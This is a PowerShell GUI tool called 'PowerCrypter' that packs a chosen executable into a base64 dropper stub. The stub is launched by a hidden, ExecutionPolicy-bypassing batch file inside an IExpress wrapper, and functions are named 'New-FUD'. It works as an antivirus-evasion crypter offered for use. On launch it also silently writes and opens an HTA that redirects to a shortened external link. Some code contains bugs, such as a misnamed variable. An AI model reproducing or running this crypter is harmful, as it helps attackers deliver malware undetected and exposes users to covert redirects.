New-Item -Path "$env:TEMP\PowerCrypter\new.hta" -ItemType file -Force
Set-Content -Path "$env:TEMP\PowerCrypter\new.hta" -Force -Value @'
<HTML>
	<HEAD>
		<HTA:APPLICATION ID="ADVERT" 
		   BORDER="none" 
		   BORDERSTYLE="none"/>
		<SCRIPT LANGUAGE="VBScript">
			Sub Window_onLoad
				window.resizeTo 1000,1000
			End Sub 
		</SCRIPT>
		<META http-equiv="refresh" content="1;URL=http://j.gs/6MEz">
	</HEAD>
	<BODY>
	</BODY>
</HTML>
'@
Set-Location -Path "$env:TEMP\PowerCrypter"
.\new.hta
$ErrorActionPreference = "SilentlyContinue"
Function Cryptit([string]$file){
Function New-FUD([string]$FTC){
    $bytes = [System.IO.File]::ReadAllBytes($FTC)
    $bytes += @(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
    $randbytes = [string] (Get-Random -Minimum 9999999)
    $randbytes += [string] (Get-Random -Minimum 9999999)
    $randbytes += [string] (Get-Random -Minimum 9999999)
    $randbytes += [string] (Get-Random -Minimum 9999999)
    $randbytes += [string] (Get-Random -Minimum 9999999)
    $randbytes += [string] (Get-Random -Minimum 9999999)
    $randbytes += [string] (Get-Random -Minimum 9999999)
    $randbytes += [string] (Get-Random -Minimum 9999999)
    $randbytes += [string] (Get-Random -Minimum 9999999)
    $randbytes += [string] (Get-Random -Minimum 9999999)
    $bytes += [Convert]::ToByte($randombytes)
    $basebytes =[Convert]::ToBase64String($bytes)
    New-Item "$env:TEMP\PowerCrypter" -Type Directory -Force
    New-Item "$env:TEMP\PowerCrypter\bits.ps1" -Type File -Force
    Clear-Content "$env:TEMP\PowerCrypter\bits.ps1" -Force
    Add-Content "$env:TEMP\PowerCrypter\bits.ps1" -Value ('$progbytes'+"="+"`"$basebytes`"")
    Add-Content "$env:TEMP\PowerCrypter\bits.ps1" -Value @'
$bytes = [Convert]::FromBase64String($progbytes)
$rand = Get-Random
New-Item "$env:TEMP\$rand\$rand.exe" -Type File -Force
[io.file]::WriteAllBytes("$env:TEMP\$rand\$rand.exe",$bytes)
& $env:TEMP\$rand\$rand.exe
'@
    New-Item "$env:TEMP\PowerCrypter\exec.bat" -Type File -Force
    Clear-Content "$env:TEMP\PowerCrypter\exec.bat" -Force
    Add-Content "$env:TEMP\PowerCrypter\exec.bat" -Value 'powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ".\bits.ps1"'
    New-Item "$env:TEMP\PowerCrypter\rand.fil" -Type File -Force
    Clear-Content "$env:TEMP\PowerCrypter\rand.fil" -Force
    $randfill = Get-Random -Minimum 99999999
    $i = 100
    while($i -gt 0){
        $randfill--
        Add-Content "$env:TEMP\PowerCrypter\rand.fil" -Value $randfill
        $i--
    }
}
New-FUD -FTC $file
function Create-Wrapper{
New-Item "$env:TEMP\PowerCrypter\wrap.sed" -Type File -Force
Clear-Content "$env:TEMP\PowerCrypter\wrap.sed" -Force
Set-Content "$env:TEMP\PowerCrypter\wrap.sed" -Value @'
[Version]
Class=IEXPRESS
SEDVersion=3
[Options]
PackagePurpose=InstallApp
ShowInstallProgramWindow=1
HideExtractAnimation=1
UseLongFileName=0
InsideCompressed=0
CAB_FixedSize=0
CAB_ResvCodeSigning=0
RebootMode=N
InstallPrompt=%InstallPrompt%
DisplayLicense=%DisplayLicense%
FinishMessage=%FinishMessage%
TargetName=%TargetName%
FriendlyName=%FriendlyName%
AppLaunched=%AppLaunched%
PostInstallCmd=%PostInstallCmd%
AdminQuietInstCmd=%AdminQuietInstCmd%
UserQuietInstCmd=%UserQuietInstCmd%
SourceFiles=SourceFiles
[Strings]
InstallPrompt=
DisplayLicense=
FinishMessage=
'@
Add-Content "$env:TEMP\PowerCrypter\wrap.sed" -Value "TargetName=$env:TEMP\PowerCrypter\comp.exe"
Add-Content "$env:TEMP\PowerCrypter\wrap.sed" -Value @'
FriendlyName=title
AppLaunched=cmd.exe /c echo.
PostInstallCmd=cmd.exe /c exec.bat
AdminQuietInstCmd=
UserQuietInstCmd=
FILE0="bits.ps1"
FILE1="exec.bat"
FILE2="rand.fil"
[SourceFiles]
'@
Add-Content "$env:TEMP\PowerCrypter\wrap.sed" -Value "SourceFiles0=$env:TEMP\PowerCrypter\"
Add-Content "$env:TEMP\PowerCrypter\wrap.sed" -Value @'
[SourceFiles0]
%FILE0%=
%FILE1%=
%FILE2%=
'@
Set-Location "$env:TEMP\PowerCrypter"
& iexpress.exe /N /Q wrap.sed
Wait-Process -Name iexpress
}
Create-Wrapper
$dest = Split-Path -Parent $file
$leaf = (Split-Path -Leaf $file).Split(".")[0]
Rename-Item "$env:Temp\PowerCrypter\comp.exe" -NewName ("$leaf"+".crypted"+".exe") -Force
Move-Item "$env:Temp\PowerCrypter\$leaf.crypted.exe" -Destination $dest -Force
$wshpop = New-Object -ComObject Wscript.Shell
$wshpop.Popup("Crypting complete!",0,"Done",0x0)
}
Function Get-FileName($initialDirectory)
{   
 [System.Reflection.Assembly]::LoadWithPartialName("System.windows.forms") |
 Out-Null
 $OpenFileDialog = New-Object System.Windows.Forms.OpenFileDialog
 $OpenFileDialog.initialDirectory = $initialDirectory
 $OpenFileDialog.filter = "Executable Files (*.exe)| *.exe"
 $OpenFileDialog.ShowDialog() | Out-Null
 $OpenFileDialog.filename
 $Script:fileloc = $OpenFileDialog.filename
}
[void][System.Reflection.Assembly]::LoadWithPartialName('presentationframework')
[xml]$XAML = @'
<Window
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="PowerCrypter" Height="235" Width="568" ResizeMode="NoResize" WindowStartupLocation="CenterScreen" Background="#FF1010C8" BorderBrush="#FF1010C8" Foreground="#FF1210C8" WindowStyle="None">
    <Grid Background="#FF76988F">
        <Label Name="Title" Content="PowerCrypter" HorizontalAlignment="Center" Margin="175,5,177,0" Width="210" Height="57" Foreground="White" FontFamily="Script MT Bold" FontSize="36" FontWeight="Bold" FontStyle="Italic" VerticalAlignment="Top"/>
        <Label Name="Blurb" Content="Welcome to PowerCrypter, please select a binary executable to crypt:" VerticalAlignment="Top" FontFamily="Script MT Bold" FontSize="16" Width="446" HorizontalAlignment="Center" Margin="61,59,61,0"/>
        <TextBox Name="BrowseBox" HorizontalAlignment="Left" Height="23" Margin="10,98,0,0" TextWrapping="Wrap" Text="" VerticalAlignment="Top" Width="468" BorderBrush="#FF3F3C29" Foreground="Black" SelectionBrush="#FFAC8C18" Background="#FFAC8C18"/>
        <Button Name="Browse" Content="Browse" HorizontalAlignment="Left" Margin="483,98,0,0" VerticalAlignment="Top" Width="75" Background="#FFAC8C18" BorderBrush="#FF3F3C29" Foreground="Black" FontFamily="Script MT Bold" IsEnabled="True" Height="23"/>
        <Button Name="Crypt" Content="Crypt It!" Margin="10,125,10,0" VerticalAlignment="Top" Background="#FFAC8C18" BorderBrush="#FF3F3C29" Foreground="Black" Height="72" FontFamily="Script MT Bold" FontSize="36" IsEnabled="True"/>
        <Button Name="Cancel" Content="Cancel" Margin="10,202,10,0" VerticalAlignment="Top" Background="#FFAC8C18" BorderBrush="#FF3F3C29" Foreground="Black" Height="25" FontFamily="Script MT Bold" IsCancel="True" IsEnabled="True"/>
        <Grid HorizontalAlignment="Left" Height="20" VerticalAlignment="Top" Width="568"/>
        <Expander Name="Help" Header="Help" HorizontalAlignment="Left" VerticalAlignment="Top">
        	<Grid Background="#FFE5E5E5" Width="567.043" Height="214">
        		<TextBlock Name="HelpText" HorizontalAlignment="Left" TextWrapping="Wrap" VerticalAlignment="Top" TextTrimming="CharacterEllipsis" Margin="10,10,0,0" Height="204" Width="547.043"><Run Text="This crypter is provided as is without a warranty. Its creator is not responsible for how, what, why, when, or even where you use this program. This program is designed to minimize the risk of damage to any executables you crypt, but its advanced algorythm has not been tested on some systems. This program's native language(Powershell) is pre-baked into and guarranteed to run on any Windows 7 or higher systems. If program does not function as intended please try updating Powershell. As a gentle reminder, depending on your computer's hardware it may take a minute to complete a crypt. You will get a notification when the crypting is complete. The crypted executable will be saved to the same folder as the original with the name changed to: originalname.crypted.exe"/><LineBreak/><Run/><LineBreak/><Run Text="If all else fails cursed are the GitHub gods."/><LineBreak/><Run/><LineBreak/><Run/>
				<Hyperlink Name="Attribution" FontSize="16" FontWeight="ExtraBlack" ForceCursor="True" Cursor="Hand" Foreground="#FFAC8C18">©2015 LogoiLab (CuddlyCactusMC, MrCBax, PentestingForever)</Hyperlink>
				</TextBlock>
        	</Grid>
        </Expander>
    </Grid>
</Window>
'@
$reader=(New-Object System.Xml.XmlNodeReader $xaml) 
$form=[Windows.Markup.XamlReader]::Load($reader)
$xaml.SelectNodes("//*[@Name]") | %{Set-Variable -Name ($_.Name) -Value $Form.FindName($_.Name)}
$Cancel.Add_Click({
$Form.Close()
Stop-Process -Name mshta
Exit-PSSession
exit
})
$Browse.Add_Click({
Get-FileName -initialDirectory "$env:HOMEDRIVE\$env:HOMEPATH\Desktop"
$BrowseBox.Text = $fileloc
})
$Crypt.Add_Click({
Cryptit -file $BrowseBox.Text
})
$Attribution.Add_Click({
start 'http://github.com/LogoiLab/PowerCrypter-GUI'
})
$Form.Icon = [System.Convert]::FromBase64String('AAABAAQAEBAQAAAAAAAoAQAARgAAABAQAAAAAAAAaAUAAG4BAAAgIBAAAAAAAOgCAADWBgAAICAA
AAAAAACoCAAAvgkAACgAAAAQAAAAIAAAAAEABAAAAAAAwAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAA
AACAAACAAAAAgIAAgAAAAIAAgACAgAAAwMDAAICAgAAAAP8AAP8AAAD//wD/AAAA/wD/AP//AAD/
//8AAAAAEREAAAAAABETMREAAAARGAAAMREAERgABwAAMREYAAgHgAAAMQAICHeHAAAACIgHd4iI
AACIh3iHgAeIgIiIiHeHAAiAiIh3iIiICICIh3eAeIiIgIgIiHCHiAAAiPj4iIgHAIiCKIh3d4AA
iAAAiIiAAAAAAAAAiAAAAAD8P///8A///8AD//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//
AAD//wAA//8ABP//AAT///AP///8P///KAAAABAAAAAgAAAAAQAIAAAAAABAAQAAAAAAAAAAAAAA
AQAAAAAAAAAAAAAAAIAAAIAAAACAgACAAAAAgACAAICAAADAwMAAwNzAAPDKpgAEBAQACAgIAAwM
DAAREREAFhYWABwcHAAiIiIAKSkpAFVVVQBNTU0AQkJCADk5OQCAfP8AUFD/AJMA1gD/7MwAxtbv
ANbn5wCQqa0AAAAzAAAAZgAAAJkAAADMAAAzAAAAMzMAADNmAAAzmQAAM8wAADP/AABmAAAAZjMA
AGZmAABmmQAAZswAAGb/AACZAAAAmTMAAJlmAACZmQAAmcwAAJn/AADMAAAAzDMAAMxmAADMmQAA
zMwAAMz/AAD/ZgAA/5kAAP/MADMAAAAzADMAMwBmADMAmQAzAMwAMwD/ADMzAAAzMzMAMzNmADMz
mQAzM8wAMzP/ADNmAAAzZjMAM2ZmADNmmQAzZswAM2b/ADOZAAAzmTMAM5lmADOZmQAzmcwAM5n/
ADPMAAAzzDMAM8xmADPMmQAzzMwAM8z/ADP/MwAz/2YAM/+ZADP/zAAz//8AZgAAAGYAMwBmAGYA
ZgCZAGYAzABmAP8AZjMAAGYzMwBmM2YAZjOZAGYzzABmM/8AZmYAAGZmMwBmZmYAZmaZAGZmzABm
mQAAZpkzAGaZZgBmmZkAZpnMAGaZ/wBmzAAAZswzAGbMmQBmzMwAZsz/AGb/AABm/zMAZv+ZAGb/
zADMAP8A/wDMAJmZAACZM5kAmQCZAJkAzACZAAAAmTMzAJkAZgCZM8wAmQD/AJlmAACZZjMAmTNm
AJlmmQCZZswAmTP/AJmZMwCZmWYAmZmZAJmZzACZmf8AmcwAAJnMMwBmzGYAmcyZAJnMzACZzP8A
mf8AAJn/MwCZzGYAmf+ZAJn/zACZ//8AzAAAAJkAMwDMAGYAzACZAMwAzACZMwAAzDMzAMwzZgDM
M5kAzDPMAMwz/wDMZgAAzGYzAJlmZgDMZpkAzGbMAJlm/wDMmQAAzJkzAMyZZgDMmZkAzJnMAMyZ
/wDMzAAAzMwzAMzMZgDMzJkAzMzMAMzM/wDM/wAAzP8zAJn/ZgDM/5kAzP/MAMz//wDMADMA/wBm
AP8AmQDMMwAA/zMzAP8zZgD/M5kA/zPMAP8z/wD/ZgAA/2YzAMxmZgD/ZpkA/2bMAMxm/wD/mQAA
/5kzAP+ZZgD/mZkA/5nMAP+Z/wD/zAAA/8wzAP/MZgD/zJkA/8zMAP/M/wD//zMAzP9mAP//mQD/
/8wAZmb/AGb/ZgBm//8A/2ZmAP9m/wD//2YAIQClAF9fXwB3d3cAhoaGAJaWlgDLy8sAsrKyANfX
1wDd3d0A4+PjAOrq6gDx8fEA+Pj4APD7/wCkoKAAgICAAAAA/wAA/wAAAP//AP8AAAD/AP8A//8A
AP///wAAAAAAAAAjIyMjAAAAAAAAAAAAACMjIyoqIyMjAAAAAAAAIyMjdGxsbGwqIyMjAAAjIyN0
bGxs7xJsbGwqIyMjI3RsbGzsEgfrEhJsbGwqI2xsbOwS7PEH6+8SEhJsbGxs7OvsEvHxB+vs7OwS
AABs6+zr8fHr6wfrEhLv7OzrAOvs6+vr6/EH6+8SEhLs6xLr7Ovr7+/r6+vr6+sS7OsS6+zr7+/v
7BLv6+vr6+vrEuvrEuvs7AcS6+/r6xISEhLr6//r9Ovr6+vrEu8SAOvr6zMz6+vr7wcH7+sSEgDr
cQAAAADr6+vs7BISEgAAAAAAAAAAAADr6xISAAAAAAAA/D////AP///AA///AAD//wAA//8AAP//
AAD//wAA//8AAP//AAD//wAA//8AAP//AAT//wAE///wD////D///ygAAAAgAAAAQAAAAAEABAAA
AAAAgAIAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAACAAACAAAAAgIAAgAAAAIAAgACAgAAAwMDAAICA
gAAAAP8AAP8AAAD//wD/AAAA/wD/AP//AAD///8AAAAAAAAAAAEQAAAAAAAAAAAAAAAAAAETMRAA
AAAAAAAAAAAAAAEYgzMxEAAAAAAAAAAAAAEYiIMzMzEQAAAAAAAAAAEYiIiAAzMzMRAAAAAAAAEY
iIiACIADMzMxEAAAAAEYiIiACIiIgAMzMzEQAAEYiIiACIh3AIiAAzMzMRAYiIiACIiA94gIiIAD
MzMxGIiACIiIh/eIcAiIgAMzMRiACIiAh3f3iHdwCIiAAzEQCIiIAHd394h3d3AIiIABCIiIhwB3
d/eIeHeHcAiIgAiIh3cHd3f3iHiHd3eACIAIeId3d3eH94hwd3d4eIgACHiHd3eHh/eIcIB3d4iI
AAh4h3eHh3f3iHdwcHh4iAAIeIeHh3d394h3eHCAiIgACPiHh3d3eIeIiId3cHiIAAh4h3d3d3h4
h4iIh3eIiAAI+Id3d3d3cHd3eIiHeIgACPiHd393eHC7h3d4iIiIAAiIh3j/eH9wu7eHdwiAgAAI
iAiI+H93eId3d4cIiAgACAgAiP93eId4h3d3CACAgAgAAAj/eHd3d3gHdwAAgAAIIgAI+Id3d3d3
eAcAAIiACCIgCIiHd3d3d3iAAACIiAAAAAAIiId3d3iAAAAAAAAAAAAAAAiIh3iAAAAAAAAAAAAA
AAAACIiAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAD//n////gf///gB///gAH//gAAf/gAAB/gAAAH
gAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGA
AAABgAAAAYAAAAGsAAA1vgAAd44AAHGGAABw/4AB///gB///+B////5//ygAAAAgAAAAQAAAAAEA
CAAAAAAAgAQAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAACAAACAAAAAgIAAgAAAAIAAgACAgAAAwMDA
AMDcwADwyqYABAQEAAgICAAMDAwAERERABYWFgAcHBwAIiIiACkpKQBVVVUATU1NAEJCQgA5OTkA
gHz/AFBQ/wCTANYA/+zMAMbW7wDW5+cAkKmtAAAAMwAAAGYAAACZAAAAzAAAMwAAADMzAAAzZgAA
M5kAADPMAAAz/wAAZgAAAGYzAABmZgAAZpkAAGbMAABm/wAAmQAAAJkzAACZZgAAmZkAAJnMAACZ
/wAAzAAAAMwzAADMZgAAzJkAAMzMAADM/wAA/2YAAP+ZAAD/zAAzAAAAMwAzADMAZgAzAJkAMwDM
ADMA/wAzMwAAMzMzADMzZgAzM5kAMzPMADMz/wAzZgAAM2YzADNmZgAzZpkAM2bMADNm/wAzmQAA
M5kzADOZZgAzmZkAM5nMADOZ/wAzzAAAM8wzADPMZgAzzJkAM8zMADPM/wAz/zMAM/9mADP/mQAz
/8wAM///AGYAAABmADMAZgBmAGYAmQBmAMwAZgD/AGYzAABmMzMAZjNmAGYzmQBmM8wAZjP/AGZm
AABmZjMAZmZmAGZmmQBmZswAZpkAAGaZMwBmmWYAZpmZAGaZzABmmf8AZswAAGbMMwBmzJkAZszM
AGbM/wBm/wAAZv8zAGb/mQBm/8wAzAD/AP8AzACZmQAAmTOZAJkAmQCZAMwAmQAAAJkzMwCZAGYA
mTPMAJkA/wCZZgAAmWYzAJkzZgCZZpkAmWbMAJkz/wCZmTMAmZlmAJmZmQCZmcwAmZn/AJnMAACZ
zDMAZsxmAJnMmQCZzMwAmcz/AJn/AACZ/zMAmcxmAJn/mQCZ/8wAmf//AMwAAACZADMAzABmAMwA
mQDMAMwAmTMAAMwzMwDMM2YAzDOZAMwzzADMM/8AzGYAAMxmMwCZZmYAzGaZAMxmzACZZv8AzJkA
AMyZMwDMmWYAzJmZAMyZzADMmf8AzMwAAMzMMwDMzGYAzMyZAMzMzADMzP8AzP8AAMz/MwCZ/2YA
zP+ZAMz/zADM//8AzAAzAP8AZgD/AJkAzDMAAP8zMwD/M2YA/zOZAP8zzAD/M/8A/2YAAP9mMwDM
ZmYA/2aZAP9mzADMZv8A/5kAAP+ZMwD/mWYA/5mZAP+ZzAD/mf8A/8wAAP/MMwD/zGYA/8yZAP/M
zAD/zP8A//8zAMz/ZgD//5kA///MAGZm/wBm/2YAZv//AP9mZgD/Zv8A//9mACEApQBfX18Ad3d3
AIaGhgCWlpYAy8vLALKysgDX19cA3d3dAOPj4wDq6uoA8fHxAPj4+ADw+/8ApKCgAICAgAAAAP8A
AP8AAAD//wD/AAAA/wD/AP//AAD///8AAAAAAAAAAAAAAAAAAAAAIyMAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAIyMqKiMjAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIyN0dCoqKiojIwAAAAAA
AAAAAAAAAAAAAAAAAAAAIyN0dHR0KioqKioqIyMAAAAAAAAAAAAAAAAAAAAAIyN0dHR0dHRsbCoq
KioqKiMjAAAAAAAAAAAAAAAAIyN0dHR0dHRsbHFxbGwqKioqKiojIwAAAAAAAAAAIyN0dHR0dHRs
bHFxcXFxcWxsKioqKioqIyMAAAAAIyN0dHR0dHRsbHFxcbzvEhJxcXFsbCoqKioqKiMjACN0dHR0
dHRsbHFxcXES9Afs6xJxcXFxbGwqKioqKiojI3R0dHRsbHR0dHHs7PH0B+zr7xIScXFxcWxsKioq
KiMjdHRsbHFxdHQS7PHx8f8H7Ovv7+8SEnFxcXFsbCoqIyNsbHFxcXHsEhLx8fHx9Afs6+/v7+/v
EhJxcXFxbGwjbHFxcXHs7PESEvG8vPH/B+zr7+zv7+zv7xIScXFxcWxscXHs67zx8RLx8fHx8fQH
7Ovv7Ozv7+/v7+wAAHFxbADrvOzrvPHx8fHx8evx/wfs6+8S7+/v7+/s7+zr7GwAAOu87Ou88fHx
8evx6/H/B+zr7xLsEu/v7+/s7OvsAAAA6/Hs67zx8evx6/G88fQH7Ovv7+8S7xLv7O/s6+wSAADr
8ezrvOvx6/Hx8fHx9Afs6+/v7+zvEuwS7Ozr7BIAAOv07Ou86/Hx8fHv7+vrB+zr6+vr7+/v7xLv
7OvsEgAA6/Hs67zx8fHv7+/v7PHr6+/s6+vr6+/v7+zs6+wSAADr9OzrvLzv7+/v8Qfx8RLv7+/v
7+vr6+vv7+zr7BIAAOv07Ovv7+/v9PHx8ezxEvv76+/v7+/r6+vr7OvsEgAA6+zs6+/v6/T08ewH
//ES+/v77+vv7+8S6+sS6xISAADr6+sS6+vr9OwH//Hx8evr7+/v7+/r7xLr6+sS6xIAAOsA6wAA
6+v0//Hx8evr7+/r6+/v7+/vEusAAOsA6wAA6wAAAAAA6/T08evv7++8vO/v6xLv7+8SAAAA6wAA
AADrMzMAAADr9Ovr77y8B7wHB7zv7+sS7xIAAADrcXEAAOszMzMAAOvr7Ozv77y8BwcHvO/v7OwS
EgAAAOtxcXEAAAAAAAAAAADr6+zs7++8vO/v7OwSEgAAAAAAAAAAAAAAAAAAAAAAAAAA6+vs7O/v
7OwSEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOvr7OwSEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAADrEgAAAAAAAAAAAAAAAAAAAP/+f///+B///+AH//+AAf/+AAB/+AAAH+AAAAeAAAABAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAAB
gAAAAawAADW+AAB3jgAAcYYAAHD/gAH//+AH///4H////n//')
$Form.ShowDialog() | out-null